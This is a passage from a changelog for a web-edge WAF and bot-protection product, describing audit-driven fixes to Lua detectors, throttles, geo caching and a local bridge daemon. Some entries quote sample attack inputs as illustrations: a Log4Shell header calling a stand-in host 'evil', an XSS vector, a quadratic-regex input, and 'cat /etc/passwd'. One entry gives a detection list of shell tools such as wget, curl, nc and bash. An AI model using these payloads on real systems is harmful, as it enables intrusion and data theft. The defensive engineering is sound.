  can momentarily admit up to ~2×, fine for a coarse bot throttle. `incr` failure
  now fails open (admit), matching the existing missing-dict policy. Force-unblock
  still clears throttle state (the IP stays the key's last field). Not addressed:
  a shared NAT IP still shares one budget across its users (a deeper keying
  question the finding raises). Found by the 2026-07 edge Lua audit (F21, medium).
- **Dashboard stats no longer scan the hot shared dicts on every poll (F20).**
  `/cfm-admin/lua-stats` computed its key-count breakdowns with `get_keys(25000)`
  on `cfm_decisions` and `get_keys(8000)` on `sslcache` on every poll. `get_keys`
  locks the whole dict for the scan, so an auto-refreshing dashboard stalled
  request processing (cfm_decisions is read on every request) and TLS handshakes
  (sslcache) box-wide. Those scan-derived counts are now cached per worker for a
  short TTL (~10 s), so the scan runs at most once per interval rather than once
  per poll; all the live fields (capacity/used %, exclude lists, cert counts,
  timestamps, ingest-lock state) are still computed fresh each request. The stats
  output is unchanged. Found by the 2026-07 edge Lua audit (F20, medium).
- **UA-emergency throttle is now a lock-free fixed-window counter (F22).** The
  operator-flagged-UA throttle was a per-UA spin-lock + token bucket on the shared
  `cfm_decisions` dict (an `add`-lock + up to 10×`sleep(1ms)` + `get` + `set` +
  `delete` per request). Under the bot wave it targets — thousands of req/s of one
  UA — that thundered on a single lock and churned the hot decision dict, slowing
  unrelated requests' decision lookups. It now does ONE atomic `incr` per request
  in its own dedicated `cfm_ua_throttle` dict: no lock, no sleep, no
  read-modify-write, and no contention with the decision cache. The cap is
  unchanged in intent — 20 requests per 2 s window = 10/s box-wide per UA with a
  burst of 20; the algorithm change means a window boundary can momentarily admit
  up to ~2× before it resets, which is fine for a coarse emergency cap. The 429 +
  `Retry-After` behavior and the fail-open-by-default / `fail_closed` policy are
  unchanged. Adds one 4 MB shared dict (declared in both `openresty.conf` and
  `angie.conf`). Found by the 2026-07 edge Lua audit (F22, medium).

### Fixed
- **sslcollector socket now actually self-heals (F28 wiring gap).** The F28 fix
  gave the SSL-collector unix-socket server a generation-guarded respawn with
  exponential backoff, but that machinery was only ever driven by
  `SockLifecycle.ApplyConfig`, which the daemon re-invokes **only on a `cfm.conf`
  content change** — never on the periodic tick (unlike `lsmLc.ApplyConfig`). So a
  socket that died mid-life, or failed its **boot-time bind** (stale socket file,
  parent dir not yet ready, `EADDRINUSE` after an unclean restart), stayed down
  until an operator edited `cfm.conf` or restarted the daemon — degrading cert
  delivery to the edge (SNI→cert) with no auto-recovery, i.e. the original F28 bug
  largely surviving. Added a lightweight `SockLifecycle.Tick(ctx)` that drives only
  the respawn state machine (no token re-validation or lua-token rewrite, so **no
  new per-tick file I/O**) and wired it into the daemon tick loop next to
  `lsmLc.ApplyConfig`. A dead server is now restarted within one tick, rate-bounded
  by the existing backoff; healthy/disabled/stopped ticks are cheap no-ops. Not on
  the request hot path (availability of TLS cert delivery, not request blocking).
  Found by the multi-agent re-verification of the 2026-07 edge Lua audit.
- **log-cfm ingest backoff is no longer dead code (declare `cfm_metrics`).** The
  edge's request-log shipper (`log-cfm.lua`) has connect-backoff + first-3-failures
  logging keyed on a `lua_shared_dict cfm_metrics` that was never declared in any
  nginx config — so the whole subsystem silently no-op'd: when the ingest socket
  was degraded, every request spawned an unthrottled connect attempt and the
  failures were 100% silent. Declaring the dict (1 MB, in both `openresty.conf`
  and `angie.conf`) re-enables the intended exponential backoff (0.1→5 s) and the
  connect-failure warnings. Log shipping is deferred off the log phase either way,
  so this never affected request latency. Found by the 2026-07 edge Lua audit
  round-2 triage.

### Security
- **Geo lookup failures are no longer cached as a country (F25, part 2).** The
  edge GeoIP layer returned `""` both for a genuine "no country for this IP" and
  for every failure mode (geo disabled, DB open/init failed, mid retry-cooldown,
  per-lookup error), and cached that `""` — so a transient mmdb hiccup (e.g. the
  `.mmdb` caught mid atomic-rename during a MaxMind update) pinned an IP's country
  as empty for the whole cache TTL. Since `""` is fail-closed for country
  *allowlists*, a poisoned IP could be wrongly challenged/blocked for that window.
  `cfm_geo.country()` now reports whether the lookup actually resolved, and only
  resolved answers (a real code, or a definitive "no country") are cached; a
  transient failure still returns `""` fail-open but is retried on the next
  request (the module's own retry cooldown bounds any lookup storm). Completes
  F25 from the 2026-07 edge Lua audit (medium).
- **Geo country cache moved to its own shared dict (F25, part 1).** The edge
  cached per-IP GeoIP country codes in `cfm_decisions` — the hot dict that also
  holds the decision cache and the abuse counters (throttle buckets, ua_emergency
  state, waf-push dedup) — at a 300 s TTL. Under a high-distinct-IP flood the
  one-entry-per-IP geo writes could LRU-evict the 90 s decision allows and those
  counters, silently weakening rate/abuse protection during exactly the flood the
  decision cache exists to shed. Geo now lives in a dedicated
  `lua_shared_dict cfm_geocache 16m` at a 90 s TTL, so its eviction pressure no
  longer touches the security state. Adds one 16 MB shared dict (declared in both
  `openresty.conf` and `angie.conf`); force-unblock clears the geo key with a
  direct delete from the new dict, and its `used_pct` is surfaced in the admin
  stats alongside the decision dict. No change to the country value the rule
  engine sees. Found by the 2026-07 edge Lua audit (F25, medium); the
  transient-failure-caching half is a follow-up.
- **Bridge decision server sets read/write/idle timeouts (F51).** The
  nginx-bridge `http.Server` had only `ReadHeaderTimeout` set, so a caller holding
  the socket token could send valid headers and then trickle the body to pin a
  goroutine indefinitely (goroutine-per-connection, no upper bound). It now sets
  `ReadTimeout=15s`, `WriteTimeout=15s` and `IdleTimeout=75s`. The values are
  deliberately generous so a deadline can only ever fire on a misbehaving
  connection, never on the real edge — which times *itself* out at ~300 ms per
  RPC, ~50× sooner. `IdleTimeout` is set explicitly (Go otherwise reuses
  `ReadTimeout` as the idle timeout) and sits above the edge's 60 s keepalive
  idle, so pooled connections are never reaped mid-pool. Together with the F49
  body caps this closes the slow-body pin. Local, token-gated socket, so a
  robustness gap rather than a remote DoS; this was the last DoS finding of the
  2026-07 edge Lua audit (F51, low).
- **Bridge POST handlers bound their request bodies (F49).** Five nginx-bridge
  handlers (`ip` push/clear, `vhost` push/clear, `waf/stats`) decoded the request
  body with no size limit, so a compromised or buggy edge worker holding the
  socket token could stream a huge body and spike daemon RSS — worst on
  `waf/stats`, which fanned out one persistence hook per decoded row. Each now
  wraps the body in `http.MaxBytesReader` with a generous, hardcoded cap sized
  above any legitimate push (256 KB for `ip` push, which carries untruncated
  per-request forensic fields — uri/ua/referer/content-type — so even a
  padded-URI attack we *want* to autoblock is never rejected; 4 KB for the tiny
  clear/vhost messages; 2 MB for the `waf/stats` batch), and `waf/stats`
  additionally caps its per-push fan-out at 8192 rows (far above the edge's own
  `get_keys(2000)` snapshot). To keep the `waf/stats` cap from ever rejecting a
  *legitimate* flush, the edge also clamps each row's host to the DNS maximum
  (253 octets) at the bucket source — otherwise a client sending padded `Host:`
  headers to a catch-all vhost could inflate a flush past 2 MB and get the whole
  batch (including co-resident legitimate rows) dropped. Local, token-gated
  socket, so a robustness gap rather than a remote DoS. Found by the 2026-07
  edge Lua audit (F49, low).
- **Ingest socket bounds concurrent connections (F52).** The webdetector ingest
  socket's accept loop spawned one goroutine (+ a 256 KB read buffer) per
  connection with no ceiling, so a cfm-group peer could open many and pin
  memory/goroutines. It now caps concurrent connections at 1024 (a generous,
  hardcoded ceiling sized over the realistic peak — the Lua sender keeps a
  per-worker keepalive pool, so the peak is workers × pool-depth, not one per
  worker — bounding worst-case ingest-buffer memory to ~256 MB) and refuses the
  excess with a throttled log. The refusal is graceful and self-healing: the
  server accepts-then-closes, so the sender's connect still succeeds (no backoff)
  and only that one log line is dropped before it retries. Found by the 2026-07
  edge Lua audit (F52, low).
- **Panel challenge scope is derived from the trusted listener port, not client
  headers (F41).** `cfm_panel.lua` computed the per-port challenge scope from
  `X-CFM-Panel-Port` / `X-Forwarded-Port` with priority over the trusted
  `$cfm_panel_origin` port. On the main panel request those headers are client
  input, so a clearance solved on one panel port could be **replayed on another
  listener** — e.g. present a `panel:2083` clearance on the WHM 2087 listener with
  `X-CFM-Panel-Port: 2083` and skip the 2087 challenge — voiding the per-port
  isolation the scope exists for (not privilege escalation; the user already holds
  a valid clearance). The scope now follows the trusted per-listener
  `$cfm_panel_origin` port and the client headers are ignored. cfm_panel.lua only
  runs on the main external request (the `/__cfm_*` sub-locations, which carry the
  listener-injected trusted header, return early), and each listener's
  `$cfm_panel_origin` port matches the `X-CFM-Panel-Port` the Go challenge server
  mints the scope from — so mint and validate stay in agreement. Found by the
  2026-07 edge Lua audit (F41, low).
- **Bridge token rotation no longer opens a fail-open window (F45).** The edge
  serves the bridge auth token from a 10s cache, so after the daemon rotates it
  (weak-token replacement at startup) the edge kept presenting the stale token
  for up to 10s → the bridge 403'd every decision RPC → `get_decision` fell to
  `fail_decision` (fail-open by default), bypassing IP/vhost/rule blocks and
  challenges for that window. Now a bridge **403** on a token-bearing request
  force-refreshes the token once (new `cfm_bridge_cfg.refresh_token_throttled`)
  and — only if the token actually **changed** — retries the RPC with the fresh
  token before failing open, so a rotation converges on the first 403 per worker
  instead of after the TTL. A persistent 403 from a genuinely wrong token can't
  amplify: the retry is skipped when the refreshed token is unchanged, and the
  file re-read is throttled to once/2s per worker. No change to the Go token-auth
  path. Found by the 2026-07 edge Lua audit (F45, low).
- **X-Forwarded-Proto is only honored from a trusted proxy now (F44).** The
  `$cf_xfp` map forwarded a client-supplied `X-Forwarded-Proto` to origin
  verbatim, with no trusted-proxy gate. In DNAT-direct deployments (no
  Cloudflare) a direct attacker on the plaintext `:9080` listener could send
  `X-Forwarded-Proto: https` and make the backend believe the request was
  secure — bypassing app HTTP→HTTPS enforcement and enabling secure-cookie
  issuance over cleartext. The header is now honored **only when the request
  arrived through a trusted proxy**, else the origin gets the real `$scheme`.
  Trust is derived from the realip module's own decision (`$remote_addr !=
  $realip_remote_addr` ⇔ the peer is in `set_real_ip_from`/`trusted_proxies.conf`),
  so there's no second copy of the Cloudflare range list to drift, and a direct
  attacker cannot forge it (realip won't rewrite for an untrusted peer — a forged
  `CF-Connecting-IP` doesn't help). The gate fails safe: a malformed/empty peer
  address and any non-`http`/`https` value both fall back to `$scheme`.
  Cloudflare Full-SSL is unaffected (already `https`); Flexible-SSL still gets the
  honored header. Mirrored in both `openresty.conf` and `angie.conf`; the `cfm`
  access log gained `xfp_trust=$xfp_trusted_peer`. Found by the 2026-07 edge Lua
  audit (F44, low).
- **WAF URI+query scan caps the path and query independently, closing a
  padding bypass (F30).** The traversal/RCE/XSS/SQLi scan surface was built with
  one combined cap — `normalize(cap(uri.."?"..args, 2048))` — so an attacker
  could prepend ~2KB of benign query bytes to push `../`, a `${jndi:` marker, or
  a UNION payload past byte 2048 before any detector ran, and a path ≥2048 bytes
  evicted the query string from the scan entirely. `scan_str` now caps the URI
  and the query **independently**, each to a new `uri_scan_len` budget (8192, the
  urlencoded POST-body budget), so neither side can evict the other and each is
  scanned to 8KB regardless of the other's length. These detectors already scan
  POST bodies to this depth, so there's no new false-positive class, and a normal
  short URI pays nothing (the cap only bounds; work scales with actual length).
  The window is deliberately **not** raised to the full 64KB request-line ceiling
  (`large_client_header_buffers 8 64k`): a >8KB query can still evade — an
  anomalous, higher bar than the old 2KB — and `uri_scan_len` is a config knob if
  fuller coverage is wanted. Safe to widen past 2048 only because F62 made the
  SQL-comment stripper O(n). Found by the 2026-07 edge Lua audit (F30, low).
- **WAF SQL-comment stripper is no longer a CPU-DoS amplifier (F62).**
  `strip_sql_comments` removed `/* … */` comments with a `/%*.-%*/` gsub whose
  lazy `.-` was **O(n²)** on crafted input with many `/*` starts and no closing
  `*/` (e.g. a query string `?x=/*a/*a/*a…`). It runs on the attacker-controlled
  URI+query scan surface and — with the stock `detectors.conf` — up to **3× per
  request** (the SQLi, SQLi-blind-lexical and SQLi-union-variant rules), so any
  client with a query string could burn Lua CPU on the WAF hot path: measured
  ~5 ms/call at the 2048 scan cap and quadratic beyond it (~85 ms at 8 KB,
  ~5.4 s at a 64 KB request line — and `large_client_header_buffers 8 64k` allows
  that). Block-comment removal is now a single-pass **O(n)** scan (find `/*`, jump
  to the next `*/`, repeat; an unterminated `/*` is kept verbatim), byte-for-byte
  identical to the old stripper (fuzz-verified over 20 000 inputs against the
  original). After: ~0.02 ms at 2 KB, ~0.6 ms at 64 KB (~230–8800× faster), and
  the common no-comment request skips the pass entirely. Found while verifying the
  F30 scan-window finding (whose fix is parked until this landed). Rule detection
  behaviour is unchanged. Found by the 2026-07 edge Lua audit (F62, low).
- **WAF smuggling detector now sees duplicate Content-Length / Transfer-Encoding
  header lines (F37).** `detect_smuggling_cl` (rule 608 `WAF_HTTP_SMUGGLING`,
  challenge) derived its `cl`/`te` values via `header_string()`, which collapses a
  duplicate-header array to its first element. But `ngx.req.get_headers()` returns
  duplicate header lines as a Lua **array** (`{"5","10"}`), not a comma-joined
  string, so the comma-based `MULTI_CL`/`MULTI_TE` checks never saw the second
  value — two `Content-Length` (or two `Transfer-Encoding`) lines were silently
  missed. Added a `type(...)=='table'` guard that flags the duplicate directly
  (mirroring `detect_range_abuse`'s `MULTI_RANGE_HEADER`), while keeping
  `CL_AND_TE` as the top-priority signal. The misleading "nginx joins duplicates
  with ', '" comment is corrected. (nginx often pre-rejects duplicate
  Content-Length, so the practical exposure was limited, but the two detectors
  were inconsistent and the comment was wrong.) Found by the 2026-07 edge Lua
  audit (F37, low).
- **WAF XSS detector now tolerates whitespace before `=` and covers many more
  event handlers (F33).** `detect_xss` (rule 302 `WAF_XSS`, challenge) checked
  only four handlers and required the name immediately followed by `=`
  (`onload=`), so an HTML-legal `onload =` / `onload\t=` (attribute parsers accept
  whitespace around `=`) evaded it — e.g. `<svg onload =alert(1)>`. Replaced the
  four literal checks with a single frontier `gmatch` that captures each
  `on<word>` followed by optional whitespace + `=` and checks it against an
  explicit handler set (auto-firing handlers — animation/transition, SVG SMIL
  begin/end, `<details ontoggle>`, popover `onbeforetoggle`, media autoplay —
  plus the classic interaction handlers). The explicit set keeps benign `on…=`
  params (`onboarding=`, `online=`) from matching, and the `%f[%w]` frontier
  keeps the WPML `?…creationError=101` non-match; it's also one scan instead of
  four. Tier unchanged (**challenge** — a solvable interstitial, not a block).
  Known FP surface at challenge: a benign request param named exactly like a
  handler, **or** a reflected GET value that contains a literal `handler=` code
  snippet (e.g. searching a dev/tutorial site for `onclick=`). This already
  applied to the original four handlers without reported incidents; the expansion
  widens it to the more search-common `onclick`/`onchange`. Kept at challenge
  because these are real reflected-XSS vectors and the hit is a solvable
  challenge — flip rule 302 to `logonly` for a burn-in if the FP rate warrants.
  Found by the 2026-07 edge Lua audit (F33, low).
- **Log4Shell header detector now catches every single-encoded form of `${` (F35).**
  `detect_log4shell` (rule 328 `WAF_CVE:LOG4SHELL`, logonly) prechecks each
  request header for a `${` before decoding, but the gate was **narrower than its
  own decoder**: it admitted only the fully-encoded `%24%7b` (lowercase-hex),
  while the decode+match two lines below flags *anything* that one-pass-decodes
  to a `${…}` lookup. So a header like `User-Agent: %24%7Bjndi:ldap://evil/a%7D`
  (uppercase hex — what `curl` emits) and the partial forms `%24{jndi:` /
  `$%7bjndi:` / `$%7Bjndi:` all decode to `${jndi:` but were skipped before the
  match ever ran. The gate now admits all six single-`%xx`-encoded adjacency
  forms of `${` via four plain needles (`${`, `%24%7`, `%24{`, `$%7`) — kept as
  substring finds so no per-header lowercase copy is allocated on the hot path,
  and FP-neutral because the decode+match remains the sole hit-decider. The
  args/body path was already unaffected (`normalize` double-decodes); double-
  encoded (`%2524%257b…`) and `%u007b` forms don't one-pass-decode to `${` and
  remain the documented args/body-normalize asymmetry. Found by the 2026-07 edge
  Lua audit (F35, low).
- **WAF CRLF detector now catches canonically-capitalized header injections
  (F34).** The raw-CR/LF branch of `detect_crlf_injection` (rule 605 `WAF_CRLF`,
  challenge tier) matched the lowercase header-name literals (`set-cookie`,
  `location`, `content-type`/`-length`) against the **un-lowercased** scan
  string, so a body/arg value injecting a raw newline followed by a
  conventionally-capitalized response-header name (`Set-Cookie:`, `Location:`)
  slipped past — only the URL-encoded branch lowercased. Now the scan string is
  lowercased once and the raw branch matches against that copy too (CR/LF bytes
  are unaffected by `lower()`, so the newline anchor still requires a real
  CR/LF). Widening detection to the natural capitalized casing does trip some
  legitimate multi-line panel/webmail traffic (a body/field line starting with
  `Location:` or `Content-Type:`), so **rule 605 is stepped down from `challenge`
  to `logonly` for a burn-in** — the fix logs the real FP rate without
  challenging anyone; promote back to `challenge` after burn-in
  (CLAUDE.md logonly→challenge→block). Found by the 2026-07 edge Lua audit
  (F34, low).
- **Edge decision logs are now proof against log forging (F39).** Several
  `[cfm]` log lines concatenate `ngx.var.uri` — which nginx serves
  **percent-decoded** — and the client `Host`, so a request path containing
  `%0A`/`%0D` decoded to a literal newline/CR inside the logged value and let an
  unauthenticated client inject forged `[cfm] ...` lines into `error.log` (the
  `/.well-known/` bypass logs at INFO on every pre-auth request, so no auth was
  needed). All user-controlled log values now pass through a control-char
  neutraliser (`log_sanitize`): the hot `log_route()` path sanitizes the whole
  concatenated message, and a new `log_ev()` helper sanitizes every argument at
  the three multi-arg `ngx.log` sites (clearance re-mint/validator errors and the
  top-level request-failure handler). Control bytes (NUL, C0 incl. CR/LF, DEL)
  are hex-escaped (`\x0A`) so they stay visible for forensics without breaking
  one-line-per-event parsing; clean messages are byte-unchanged. Found by the
  2026-07 edge Lua audit (F39, low).
- **`/__ssl_debug` now enforces loopback with the un-forgeable real peer (F56).**
  The sslcollector debug endpoint (`ready`/`version` of the `sslcache` dict) was
  gated only by `allow 127.0.0.1; deny all;`, which the `ngx_http_access` module
  evaluates against the **real_ip-rewritten** `$remote_addr` — so a
  Cloudflare-fronted request carrying `CF-Connecting-IP: 127.0.0.1` (behind a
  trusted proxy) could forge a loopback origin and read it. The four
  `location = /__ssl_debug` blocks (`openresty.conf` + `angie.conf`, ×2 server
  blocks each) now add the same `cfm_purge.check_loopback()` gate that
  `/cfm-admin/purge-ip` uses — it reads the pre-rewrite `$realip_remote_addr`,
  which a header cannot spoof — and 403 a non-loopback peer, plus `allow ::1;` to
  match. **DNAT-safe:** this endpoint is also the canonical edge health probe
  (the DNAT failsafe GETs it and treats non-200 as "edge down"); the genuine
  loopback probe (no forwarded headers, real peer `127.0.0.1`) always passes, and
  if `cfm_purge` can't load the gate **fails open** (still 200) so a broken module
  can never trigger a false DNAT-off. Found by the 2026-07 edge Lua audit (F56, low).
- **Edge proxy no longer leaks its version in the `Server` header / error pages
  (F61).** Added `server_tokens off;` to the `http{}` block of both `openresty.conf`
  and `angie.conf`. Previously unset (nginx defaults to `on`), so responses and
  stock error pages advertised the exact proxy build — free reconnaissance for
  matching version-specific exploits. `off` keeps the product name but drops the
  version. Found by the 2026-07 edge Lua audit (F61, info).
- **WAF now inspects request bodies on clean-URL / REST endpoints (F07).** The
  body-read gate `waf_should_read_body` was a **positive URI allowlist** (wp-*,
  `/api/`, `/admin`, `*.php`, …) and **POST-only**, so a body-borne SQLi/RCE/
  webshell POSTed to any non-listed extension-less route (`/checkout`, `/order`,
  clean-URL app routers) — or sent via PUT/PATCH — was never read, and every
  body-aware rule saw an empty body (the Go log engine scores access logs only,
  so nothing compensated). The gate now also reads the body for **POST/PUT/PATCH**
  on **any** path when the **Content-Type is inspectable** (`urlencoded`/`json`/
  `multipart`/`xml`/`text`) and the **Content-Length is present and bounded**
  (`waf_body_read_max_cl`, default 1 MiB, env `CFM_WAF_BODY_READ_MAX_CL`). To
  guarantee **zero behavioural change for existing POST flows**, a **POST** on an
  allowlisted URI still reads regardless of size (the pre-F07 fast-path); every
  other case — POST on a clean URL, and **PUT/PATCH on any path including
  allowlisted ones** (never body-inspected before F07, so bounding them is
  strictly safer) — goes through the shared size/Content-Type gate. Binary/media
  Content-Types, over-cap bodies, and **any chunked / unmeasurable-length** body
  are skipped so large uploads keep **streaming** (the `proxy_request_buffering=off`
  media location is never forced to buffer, even for a large `PUT /uploads/x.zip`).
  On the main dynamic path
  (`location /`) nginx already buffers the body (`proxy_request_buffering on`), so
  the added cost is bounded scan CPU, not new I/O. Same rules/tiers, coverage
  only — the block-tier `WAF_SQLI`/`WAF_RCE`/`WAF_UPLOAD_FNAME` families now scan
  bodies on more paths, so watch their hit-rates after upgrade (same posture as
  F08; `waf_security` `DRY_RUN` is the lever if false positives appear). Found by
  the 2026-07 edge Lua audit (F07).
- **WAF: pre-auth base64 `<?php` on wp-admin AJAX is now visible (F11).** The
  encoded-`<?php` opener rules (437 url/entity form, 438 base64) were suppressed
  on the entire `/wp-admin/` prefix on the assumption those requests had already
  passed WordPress cookie-auth. That is wrong for `admin-ajax.php` and
  `admin-post.php`, which serve `wp_ajax_nopriv_*` / unauthenticated `admin-post`
  actions and are reachable pre-auth — so an unauthenticated attacker could
  smuggle a base64 `<?php` body there completely unseen. The naive fix (arm 438
  there) would re-run a documented false-positive incident: WPCode / Code-Snippet
  plugins legitimately base64-POST `<?php` to `admin-ajax.php` on every snippet
  save, and the edge can't tell an authed save from a nopriv attack. So the
  carve-out is split: 437 (FP-prone) stays fully suppressed on `/wp-admin/`, and
  438 (base64) is recorded at **`logonly`** on the two pre-auth endpoints —
  detection with **zero enforcement** (no challenge, no block, no ban: a
  `logonly` hit is dropped by the autoblock feed, which ingests only
  `action=block`, and no `WAF_BACKDOOR` rule is block-tier) — so operators can
  watch the pre-auth
  base64 stream (rule 438 on an admin-ajax URI) and separate real attacks from
  plugin noise before any promotion. The rest of `/wp-admin/` (authenticated
  editors) is unchanged. Found by the 2026-07 edge Lua audit (F11).
- **WAF encoded-`<?php` opener (rule 437) no longer challenges legit content
  POSTs (F16).** `detect_php_encoded_opener` flagged the URL-encoded
  (`%3C%3Fphp`), HTML-entity (`&lt;?php`) and JS-unicode encoded forms of a PHP
  opener in request bodies — but those are the *normal on-wire encoding of
  legitimate content*, not evasion: an `application/x-www-form-urlencoded` body
  is url-encoded in its entirety, so any comment/forum/contact-form/paste POST
  that merely contains `<?php` produced `%3C%3Fphp` and was challenged at rule
  437 (breaking non-browser API/mobile clients that can't solve the
  interstitial); rich-text editors HTML-escape pasted code; and Go/JS JSON
  encoders escape `<` by default. Those three forms are now **removed** from the
  rule. What remains is attack-shaped with ~zero FP: the **base64** form (438,
  unchanged — a browser never base64-encodes a field) and the **JS `\x`
  hex-escape** form (`\x3c\x3fphp`) at 437 — kept because a url-encoded backslash
  is `%5C` (a form body can't carry a literal `\x3c`) and `normalize()` never
  unwraps `\xNN`, so 437 is the only coverage for a *markerless* hex opener.
  Coverage of the removed forms is not lost: a *marker-bearing* payload (`<?php
  system($_GET…`) is still caught by the PHP webshell-body scorer (rule 404,
  `detect_php_webshell_body`), which url-decodes the body and scores `<?php` +
  exec-marker + superglobal at the same `challenge` tier. Found by the 2026-07
  edge Lua audit (F16).
- **WAF command-dispatcher detector (rule 310) no longer challenges legit
  `system=`/`command=` values (F14).** `detect_cmd_param_key` fired
  `CMD_SYSTEM`/`CMD_COMMAND` when a `system=`/`command=`/`cmd=` value tokenised
  to a word in its shell-command list, but (a) the tokeniser split on `-`, so
  compound identifiers shattered — `system=host-01` → `{host, 01}` → matched
  `host`; and (b) the list held ubiquitous words (`id`, `host`, `more`, `less`,
  `head`, `tail`, `env`, `cat`, `ls`, `ps`, `w`, `pwd`, `fetch`, `route`,
  `ping`, `dig`, `arp`). Since `system=`/`command=` have no elFinder carve-out,
  legit values (`command=more`, `system=host-01`, `command=fetch`, `env=prod`,
  OpenCart `route=`) were challenged — breaking XHR/JSON consumers ("Data is
  not JSON"). Fix: hyphen is no longer a token separator (real `cmd arg`
  invocations use whitespace), and the ambiguous words were removed from the
  list. Weaponized forms still fire via the existing metachar/path checks
  (`cat /etc/passwd`, `id;`, `command=curl http://…`); only the bare,
  un-metachar'd recon probe (`command=id`) is no longer flagged — an accepted
  trade for eliminating the FP class. Unambiguous tool names (`whoami`,
  `uname`, `wget`, `curl`, `nc`, `bash`, `chmod`, `passthru`, …) still fire.
  Found by the 2026-07 edge Lua audit (F14).
- **WAF multipart-boundary check (rule 604) no longer challenges RFC-legal
  boundaries (F15).** `detect_content_type_anomaly`'s `CT_BAD_BOUNDARY` validated
  the `boundary=` value against `[A-Za-z0-9._-]` only, but RFC 2046
  `bcharsnospace` also permits `' ( ) + , / : = ?`. Real server-to-server MIME
  producers use them — JavaMail (`----=_Part_0_123.456`), Python `email`
  (`===============…==`), SOAP/Axis — so their multipart POST was challenged at
  rule 604. These are non-browser clients that cannot solve a JS challenge, so
  the request broke outright. The validator now matches `bcharsnospace` exactly;
  characters *outside* it (space, control bytes, `<` `>` `;` `"` `@` `$` `%`
  backtick — the ones that actually desync a WAF-vs-PHP multipart split) are
  still rejected, so the anti-evasion value is preserved. Found by the 2026-07
  edge Lua audit (F15).
- **WAF body inspection no longer truncated below the per-Content-Type scan
  budget (F08).** The edge body reader (`get_req_body_for_waf` in `cfm.lua`)
  handed the WAF at most `waf_body_max_len` = **8192** bytes, but the engine's
  per-Content-Type budgets are larger (`json` 32768, `multipart`/`xml` 16384) —
  so the reader truncated the body *before* the budget applied, and those
  budgets were never realised. A classic body-size evasion (pad >8 KB of filler,
  then the SQLi/RCE/webshell payload) escaped every body-aware rule while the
  origin processed the full body. The reader cap is raised to **32768**
  (= the largest budget), making the per-type budget the sole truncation
  authority; same rules, same tiers, coverage only, and well within the
  existing 65536-byte challenge-replay buffer. A cross-referenced invariant
  (reader cap ≥ max `body_scan_budget`) is asserted by
  `scripts/tests/cfm_waf_body_budget_test.lua` (verified to fail at the old
  8192). **Operators:** this widens the *scanned window* of the already
  block-tier + autoblock-armed families (`WAF_SQLI`/`WAF_RCE`/`WAF_UPLOAD_FNAME`)
  from 8 KB to 16–32 KB of body — their earlier block/FP burn-in predates this
  window, so watch those hit-rates after upgrade; a legit 8–32 KB JSON/multipart
  body matching a signature past byte 8192 now blocks (and can 6h-ban). As a
  symmetric side effect the ClamAV upload lane (which reads the same capped
  body) now routes multipart uploads whose `filename=` sits past byte 8192 to
  the scanner (a coverage gain). Do **not** lower the `CFM_WAF_BODY_MAX_LEN`
  override below the max budget or you reopen F08. Found by the 2026-07 edge Lua
  audit (F08).
- **Challenge/WAF bypass-list generator hardened against overbroad / poisoned
  feed prefixes.** `configs/challenge_waf_bypass.conf` is a geo include whose
  every prefix makes `cfm.lua` early-return straight to origin, disabling WAF
  **and** challenge for that IP space. Its generator (`scripts/build_bypass_list.py`,
  a manually-run Python script — there is no "Go generator" despite the audit
  note) previously validated only CIDR *syntax*: an over-broad or poisoned feed
  prefix (`0.0.0.0/0`, a `/8`, a whole hosting ASN) would have been emitted
  verbatim and silently turned protection off for a huge range, and a
  feed-controlled JSON `creationTime` written into a comment could inject a
  standalone geo directive via an embedded newline. The generator now: rejects
  non-public ranges (`0.0.0.0/0`/`::/0`, RFC1918/loopback/link-local/multicast/
  reserved) and anything broader than the shipped floors (IPv4 `/16`, IPv6 `/32`
  — no current prefix dropped), with per-source and total count caps that abort
  the run; sanitises all metadata (strips CR/LF/control) before writing; writes
  atomically (temp + fsync + rename); and refuses to replace the list with a
  suspiciously small one (< floor or a >50% shrink), keeping the last-good file.
  A new offline CI guardrail `scripts/tests/check_bypass_list.sh` (+
  `bypass_list_test.py`) unit-tests these bounds and re-validates the committed
  `challenge_waf_bypass.conf` with the generator's own `normalize_prefix` (no
  network, no rule drift), wired into `security.yml` and `/preflight`. The unused
  duplicate `scripts/challenge_waf_bypass.conf` was removed and the generator's
  default output now resolves to the authoritative `configs/` copy. Found by the
  2026-07 edge audit coverage-gap review.
- **GhostLock (CVE-2026-43499) posture — design note.** Added
  `docs/ghostlock-tenant-seccomp-design.md`: a design-only guide for the one
  runtime control that could *prevent* (not just degrade/detect) the public
  local-root exploit — a **per-tenant seccomp filter** denying the futex-PI
  operations (`FUTEX_LOCK_PI`/`TRYLOCK_PI`/`WAIT_REQUEUE_PI`/`CMP_REQUEUE_PI`)
  to the web-tier uid range (`cfm_watched_uids`). Documents why it cannot be a
  BPF-LSM rule (no LSM hook on `futex()`), why it is scoped to **bare metal /
  empty VM / custom installs** and explicitly *not* cPanel/DirectAdmin/CloudLinux
  (CageFS/LVE owns tenant confinement there), and how it layers on the shipping
  levers `kernsec randomize_kstack_offset=on` and `cfm-lsm CFML-FS-008`. No code
  change — guide only.
- **Scoped-vs-admin boundary — edge `lua-stats` (F01):** the `/cfm-admin/lua-stats`
  dashboard endpoint (rendered inside OpenResty/Angie) gated access with an
  `auth_request` pointed at `/api/v1/tokens/me` — a **scoped-OR-admin** endpoint
  that returns 200 for *any* valid token. A scoped cPanel **viewer** token
  therefore passed the gate and received the **fleet-wide** stats blob: every
  tenant's WAF exclude host/path lists and per-rule modes (logonly vs block),
  plus cert and decision-cache counters — enough to craft WAF bypasses against
  the whole box. Added an admin-only auth probe `/api/v1/admin/authcheck`
  (`RequireAdmin`; 403 for scoped/anonymous) and repointed the `auth_request`
  gate to it in **both** `openresty.conf` and `angie.conf` (two server blocks
  each). The admin WebUI dashboard — the only legitimate consumer — is
  unaffected. Found by the 2026-07 edge Lua audit.
- **WAF hit-rates cross-tenant leak (F02):** `GET /api/v1/waf/hit-rates` was
  gated scoped-OR-admin but read the `?host=` query verbatim with no scope check,
  so a scoped cPanel user could read **any** vhost's per-rule WAF hit rates — and
  an empty host aggregated **every** tenant — revealing which rules are logonly
  vs block and where they fire. `handleWAFHitRates` now enforces the token scope,
  keyed on **role** (not on the presence of a scope map — so a vhost-less scoped
  token can never be misread as admin): a non-admin caller must target a single
  host inside a **non-empty** allowlist; an empty host, an empty scope, or an
  out-of-scope host is `403`. The host is normalized (lowercased) once so the
  scope check and the case-sensitive history read agree. Admin/loopback (the CLI)
  is unchanged. Mirrors the role-keyed `scopedMySQLFilterHandler` / `vhostAllowed`
  guards; added to `docs/endpoint_scope_inventory.md`. Found by the 2026-07 edge
  Lua audit.
